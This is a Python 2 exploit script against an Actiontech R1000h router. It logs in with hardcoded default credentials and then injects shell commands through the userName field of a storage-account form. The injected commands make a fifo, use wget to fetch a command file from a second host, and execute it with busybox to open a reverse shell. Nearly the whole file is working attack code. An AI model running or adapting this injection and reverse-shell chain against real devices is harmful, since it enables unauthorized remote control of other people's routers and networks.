#!/usr/bin/env python2.7
"""This script will log into an Actiontech R1000h router at the hardcoded IP
and attempt to start a reverse shell. Must have listener on destination server"""

# Yeah ok, so this is an old, out of date non-pythonic way of doing things. 
# TO do things: make pylint with native macOS python, PEP compliant.

import string
import random
import urllib
import urllib2
from urllib2 import Request, urlopen, URLError

def id_generator(size=6, chars=string.ascii_lowercase):
    return ''.join(random.choice(chars) for _ in range(size))

def send_Action_request(URLAction,PostData,URLHeaders):
    data = urllib.urlencode(PostData)
    request = urllib2.Request(URLAction, data, URLHeaders)
    try:
        response = urllib2.urlopen(request)
    except URLError as e:
        if hasattr(e, 'reason'):
            print 'We failed to reach a server.'
            print 'Reason: ', e.reason
        elif hasattr(e, 'code'):
            print 'The server couldn\'t fulfill the request.'
            print 'Error code: ', e.code
    else:
        rep_return = response.read()
        rep_info = response.info()
        print 'Return Code: '+str(response.getcode())+str(rep_info)
        return rep_return

user_agent = 'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)'
headers = {     'User-Agent' : user_agent,
                'Cookie' : 'Om=NomNom' }
target_ip = "http://172.16.12.1"

login_values = {'inputUserName' : 'root',
                'inputPassword' : 'toor',
                'nothankyou' : '1' }
login = target_ip+"/login.cgi"

# attempt to login, hardcoded for the moment
login_response = send_Action_request(login,login_values,headers)
if 'msg=passwordSetWrong' in login_response:
    print "Failed to login"
    print str(login_response)
    exit(1)
else:
    print "I think the login was successful"

#Create fifo
storage_add_user = target_ip+"/storageuseraccountcfg.cmd"
username = id_generator()
smb_post = { "action" : "add",
		"userName" : username+";rm /var/fifo2; mknod /var/fifo2 p",
		"Password" : "123",
		"volumeName" : "usb1_1"
	  }
#print "Username: "+smb_post["userName"]
#smb_response = send_Action_request(storage_add_user,smb_post,headers)

# Grab the commands to execute from our mini-server.py, and store in a file
username = id_generator()
smb_post["userName"]=username+";cd /var;wget http://172.16.12.2:8080"
print "Sending: cd /var;wget http://172.16.12.2:8080"
smb_response = send_Action_request(storage_add_user, smb_post, headers)

# Second call to exec the file we saved from the previous step that has stored our commands, 
# and start the reverse shell.
username = id_generator()
smb_post["userName"]=username+";busybox sh /var/index.html"
print "Username: busybox sh /var/index.html"
smb_response = send_Action_request(storage_add_user, smb_post, headers)
print "smb_response" + smb_response

#At this point the program won't exit, it'll hang while the shell is running
